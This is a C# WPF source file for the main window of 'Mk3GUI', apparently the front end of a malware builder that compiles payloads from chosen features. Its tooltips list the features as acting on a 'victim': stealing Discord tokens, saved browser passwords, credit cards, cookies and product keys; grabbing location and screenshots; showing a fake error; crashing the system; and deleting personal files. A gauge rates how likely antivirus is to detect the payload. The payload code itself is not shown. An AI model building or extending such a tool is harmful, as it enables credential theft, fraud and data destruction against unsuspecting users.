using System;
using System.Diagnostics;
using System.Timers;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using MaterialDesignThemes.Wpf;


namespace Mk3GUI
{
    public class FeatureProperties
    {
        public bool Enabled = false;
        public double Impact = 0; 
    }

    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>

    public partial class MainWindow : Window
    {

        public static bool setTopClicked = false;

        public MainWindow()
        {
            InitializeComponent();
        }

        private void Window_Initialized(object sender, EventArgs e)
        {

            ErrorMessageTitle.ToolTip = new ToolTip { Content = "Sets a title for the \"Fake Error Msg\" pop-up.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            ErrorMessageDescription.ToolTip = new ToolTip { Content = "Sets a description for the \"Fake Error Msg\" pop-up.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            DetectionPercentage.ToolTip = new ToolTip { Content = "Arbitrary value of how likely it will be for an antivirus to detect this payload's feature set.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };

            CompileButton.ToolTip = new ToolTip { Content = "Build a payload based on the feature set you've selected.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            SaveConfigButton.ToolTip = new ToolTip { Content = "Save the current payload configuration to a file to be used later.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            LoadConfigButton.ToolTip = new ToolTip { Content = "Load a payload configuration from a file.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            GithubButton.ToolTip = new ToolTip { Content = "Visit us on GitHub.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            DiscordButton.ToolTip = new ToolTip { Content = "Join the official Studio 7 Discord server.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            HelpButton.ToolTip = new ToolTip { Content = "Need help on what to do? Click here to be taken to the tutorial.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };

            // Silent Checkboxes Click Event
            CoordDumpCheckBox.ToolTip = new ToolTip { Content = "Get's the precise geo-coordinates to the vitim's current location without using GPS.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            IpGrabCheckBox.ToolTip = new ToolTip { Content = "Get's the victim's IPv4 address & geo information.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            CompInfoCheckBox.ToolTip = new ToolTip { Content = "Get's the victim's basic system hardware and software information.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            FakeErrorCheckBox.ToolTip = new ToolTip { Content = "Shows a fake error message when the payload is ran.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };

            // Loud Checkboxes Click Event
            TokenGrabberCheckBox.ToolTip = new ToolTip { Content = "Grabs the victim's Discord token(s).", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            ScreenshotCheckBox.ToolTip = new ToolTip { Content = "Takes a screenshot of the victim's desktop at the time of running the payload.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            BSoDCheckBox.ToolTip = new ToolTip { Content = "Triggers a windows Blue Screen of Death (BSoD) with an error code of OxDEADFEED.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            StarveSysCheckBox.ToolTip = new ToolTip { Content = "Starves the CPU of resources until the system crashes (Lag Machine).", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            KillDesktopCheckBox.ToolTip = new ToolTip { Content = "Temporarily disables the victim's desktop.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            ShutdownCheckBox.ToolTip = new ToolTip { Content = "Turns off the victim's machine.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };

            // Nuclear Checkboxes Click Event
            PasswordDumpCheckBox.ToolTip = new ToolTip { Content = "Grabs the victim's saved passwords from over 25 different browsers.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            DeletePersonalCheckBox.ToolTip = new ToolTip { Content = "Deletes all of the victim's personal files (Documents, Pictures & Videos).", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            NukeDesktopCheckBox.ToolTip = new ToolTip { Content = "Deletes any files on the victim's desktop.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            ChromeCardDumpCheckBox.ToolTip = new ToolTip { Content = "Grabs the victim's saved credit card information from over 25 different browsers.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            StealKeyCheckBox.ToolTip = new ToolTip { Content = "Grabs the victim's product key and activation type.", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };
            CookieDumpCheckBox.ToolTip = new ToolTip { Content = "Grabs all of the victim's cookies (only enable if needed; this will generate significantly larger dumps).", Background = new SolidColorBrush { Color = Color.FromRgb(54, 57, 73) } };


            // Silent Checkboxes Click Event
            CoordDumpCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
            IpGrabCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
            CompInfoCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
            FakeErrorCheckBox.Click += new RoutedEventHandler(CheckBoxClick);

            // Loud Checkboxes Click Event
            TokenGrabberCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
            ScreenshotCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
            BSoDCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
            StarveSysCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
            KillDesktopCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
            ShutdownCheckBox.Click += new RoutedEventHandler(CheckBoxClick);

            // Nuclear Checkboxes Click Event
            PasswordDumpCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
            DeletePersonalCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
            NukeDesktopCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
            ChromeCardDumpCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
            StealKeyCheckBox.Click += new RoutedEventHandler(CheckBoxClick);
            CookieDumpCheckBox.Click += new RoutedEventHandler(CheckBoxClick);

            /* Mouse Down Events */
            // Silent Checkboxes Click Event
            CoordDumpCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
            IpGrabCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
            CompInfoCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
            FakeErrorCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);

            // Loud Checkboxes Click Event
            TokenGrabberCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
            ScreenshotCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
            BSoDCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
            StarveSysCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
            KillDesktopCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
            ShutdownCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);

            // Nuclear Checkboxes Click Event
            PasswordDumpCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
            DeletePersonalCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
            NukeDesktopCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
            ChromeCardDumpCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
            StealKeyCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);
            CookieDumpCheckBox.PreviewMouseUp += new MouseButtonEventHandler(CheckBoxMouseUp);

 

            /* Mouse Up Events */
            // Silent Checkboxes MouseDown Event
            CoordDumpCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
            IpGrabCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
            CompInfoCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
            FakeErrorCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);

            // Loud Checkboxes MouseDown Event
            TokenGrabberCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
            ScreenshotCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
            BSoDCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
            StarveSysCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
            KillDesktopCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
            ShutdownCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);

            // Nuclear Checkboxes MouseDown Event
            PasswordDumpCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
            DeletePersonalCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
            NukeDesktopCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
            ChromeCardDumpCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
            StealKeyCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);
            CookieDumpCheckBox.PreviewMouseDown += new MouseButtonEventHandler(CheckBoxMouseDown);

            Globals.StaticTimer.Elapsed += new ElapsedEventHandler(HandleTick);
            Globals.StaticTimer.Start();

        }

        public void HandleTick(object sender, ElapsedEventArgs e)
        {
            int CurrentDetectionRating = 0;
            
            DetectionPercentage.Dispatcher.Invoke(() =>
            {
                CurrentDetectionRating = int.Parse(DetectionPercentage.Content.ToString().Split('%')[0]);
            });

            if (CurrentDetectionRating == (Globals.DetectionRating * 100))
                return;

            if (Globals.TickEaseValue == 0)
            {
                if (Math.Abs(CurrentDetectionRating - (Globals.DetectionRating * 100)) == 5)
                {
                    Globals.TickEaseValue = 2;
                }
                else if (Math.Abs(CurrentDetectionRating - (Globals.DetectionRating * 100)) == 4)
                {
                    Globals.TickEaseValue = 4;
                }
                else if (Math.Abs(CurrentDetectionRating - (Globals.DetectionRating * 100)) == 3)
                {
                    Globals.TickEaseValue = 8;
                }
                else if (Math.Abs(CurrentDetectionRating - (Globals.DetectionRating * 100)) == 2)
                {
                    Globals.TickEaseValue = 16;
                }
                else if (Math.Abs(CurrentDetectionRating - (Globals.DetectionRating * 100)) == 1)
                {
                    Globals.TickEaseValue = 32;
                }
                else
                {
                    Globals.TickEaseValue = 0;
                }

                if (CurrentDetectionRating > (Globals.DetectionRating * 100))
                    CurrentDetectionRating--;

                if (CurrentDetectionRating < (Globals.DetectionRating * 100))
                    CurrentDetectionRating++;
                
                DetectionPercentage.Dispatcher.Invoke(() =>
                {
                    DetectionPercentage.Content = CurrentDetectionRating.ToString() + "% chance";
                });
            }
            
            if (Globals.TickEaseValue != 0)
            {
                Globals.TickEaseValue--;
            }

        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            AcrylicAPI.EnableBlur(this);
        }
        
        private void CheckBoxMouseDown(object sender, MouseButtonEventArgs e)
        {
            var HostObj = (Button)sender;

            HostObj.RenderTransform = new RotateTransform()
            {
                CenterX = 10,
                CenterY = 10
            };

            if (((PackIcon)HostObj.Content).Kind == PackIconKind.CheckboxOutline)
            {
                HostObj.RenderTransform.BeginAnimation(RotateTransform.AngleProperty, Animations.CheckBoxClickDown2);
            }
            else
            {
                HostObj.RenderTransform.BeginAnimation(RotateTransform.AngleProperty, Animations.CheckBoxClickDown);
            }

        }

        private void CheckBoxMouseUp(object sender, MouseButtonEventArgs e)
        {
            var HostObj = (Button)sender;

            HostObj.RenderTransform = new RotateTransform()
            {
                CenterX = 10,
                CenterY = 10
            };

            if (((PackIcon)HostObj.Content).Kind == PackIconKind.CheckboxOutline)
            {
                Animations.DoCheckBoxBounce(HostObj, true);
            }
            else
            {
                Animations.DoCheckBoxBounce(HostObj, false);
            }

        }

        private void CheckBoxClick(object sender, RoutedEventArgs e)
        {
            var HostObj = (Button)sender;
            string context;


            // Manage & Change the PDR & Percentage value
            switch (HostObj.Name)
            {
                case "CoordDumpCheckBox":
                    context = "CoordinateDump";
                    break;

                case "IpGrabCheckBox":
                    context = "IPGrabber";
                    break;

                case "CompInfoCheckBox":
                    context = "ComputerInfo";
                    break;
                
                case "FakeErrorCheckBox":
                    context = "FakeError";
                    break;
                
                case "TokenGrabberCheckBox":
                    context = "TokenGrabber";
                    break;
                
                case "ScreenshotCheckBox":
                    context = "TakeScreenshot";
                    break;
                
                case "BSoDCheckBox":
                    context = "BSoD";
                    break;

                case "StarveSysCheckBox":
                    context = "StarveSystem";
                    break;
                
                case "KillDesktopCheckBox":
                    context = "KillDesktop";
                    break;
                
                case "ShutdownCheckBox":
                    context = "ShutdownPC";
                    break;
                
                case "PasswordDumpCheckBox":
                    context = "ChromePassDump";
                    break;
                
                case "DeletePersonalCheckBox":
                    context = "DeletePersonalFiles";
                    break;
                
                case "NukeDesktopCheckBox":
                    context = "NukeDesktop";
                    break;
                
                case "ChromeCardDumpCheckBox":
                    context = "ChromeCreditDump";
                    break;
                
                case "StealKeyCheckBox":
                    context = "StealProductKey";
                    break;
                
                case "CookieDumpCheckBox":
                    context = "ChromeCookieDump";
                    break;

                default:
                    context = "";
                    break;

            }

            if (((PackIcon)HostObj.Content).Kind == PackIconKind.CheckboxOutline) // If it is being UnChecked
            {
                Globals.FeatureSet[context].Enabled = false;
                HostObj.Content = new PackIcon { Width = 18, Height = 18, Kind = PackIconKind.CheckboxBlankOutline };
            }
            else
            {
                Globals.FeatureSet[context].Enabled = true;
                HostObj.Content = new PackIcon { Width = 18, Height = 18, Kind = PackIconKind.CheckboxOutline }; ;
            }

            HandlerMethods.UpdateDetectionRating(this);
        }

        private void Window_LostFocus(object sender, RoutedEventArgs e)
        {
            //AcrylicAPI.DisableBlur(this);
        }

        private void Window_GotFocus(object sender, RoutedEventArgs e)
        {
            //AcrylicAPI.EnableBlur(this);
        }

        private void DragBar_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ChangedButton == MouseButton.Left)
                this.DragMove();
        }

        private void ButtonKeepTop_Click(object sender, RoutedEventArgs e)
        {
            if (setTopClicked == false)
            {
                this.Topmost = true;
                ButtonKeepTop.ToolTip = new ToolTip { Content = "Keep On Top (Yes)" };
                ButtonKeepTop.Foreground = (Brush)(new System.Windows.Media.BrushConverter()).ConvertFromString("#DDFFFFFF");
                setTopClicked = true;
            }
            else if (setTopClicked == true)
            {
                this.Topmost = false;
                ButtonKeepTop.ToolTip = new ToolTip { Content = "Keep On Top (No)" };
                ButtonKeepTop.Foreground = (Brush)(new System.Windows.Media.BrushConverter()).ConvertFromString("#7FFFFFFF");
                setTopClicked = false;
            }
        }

        private void ButtonMinimize_Click(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private void ButtonClose_Click(object sender, RoutedEventArgs e)
        {
            Globals.StaticTimer.Stop();
            this.Close();
        }

        private void QuietGrid_MouseEnter(object sender, MouseEventArgs e)
        {
            QuietIcon.BeginAnimation(MahApps.Metro.IconPacks.PackIconMaterial.OpacityProperty, Animations.FadeInPartial);
            QuietDescription.Foreground.BeginAnimation(SolidColorBrush.ColorProperty, Animations.FadeColorGreenIn);
        }

        private void QuietGrid_MouseLeave(object sender, MouseEventArgs e)
        {
            QuietIcon.BeginAnimation(MahApps.Metro.IconPacks.PackIconMaterial.OpacityProperty, Animations.FadeOutPartial);
            Animations.FadeColorOut(ref QuietDescription);
        }

        private void LoudGrid_MouseEnter(object sender, MouseEventArgs e)
        {
            LoudIcon.BeginAnimation(MahApps.Metro.IconPacks.PackIconMaterial.OpacityProperty, Animations.FadeInPartial);
            LoudDescription.Foreground.BeginAnimation(SolidColorBrush.ColorProperty, Animations.FadeColorYellowIn);
        }

        private void LoudGrid_MouseLeave(object sender, MouseEventArgs e)
        {
            LoudIcon.BeginAnimation(MahApps.Metro.IconPacks.PackIconMaterial.OpacityProperty, Animations.FadeOutPartial);
            Animations.FadeColorOut(ref LoudDescription);
        }

        private void NuclearGrid_MouseEnter(object sender, MouseEventArgs e)
        {

            NuclearIcon.BeginAnimation(MahApps.Metro.IconPacks.PackIconMaterial.OpacityProperty, Animations.FadeInPartial);
            NuclearDescription.Foreground.BeginAnimation(SolidColorBrush.ColorProperty, Animations.FadeColorRedIn);
        }
        private void NuclearGrid_MouseLeave(object sender, MouseEventArgs e)
        {

            NuclearIcon.BeginAnimation(MahApps.Metro.IconPacks.PackIconMaterial.OpacityProperty, Animations.FadeOutPartial);
            Animations.FadeColorOut(ref NuclearDescription);
        }

    }
}
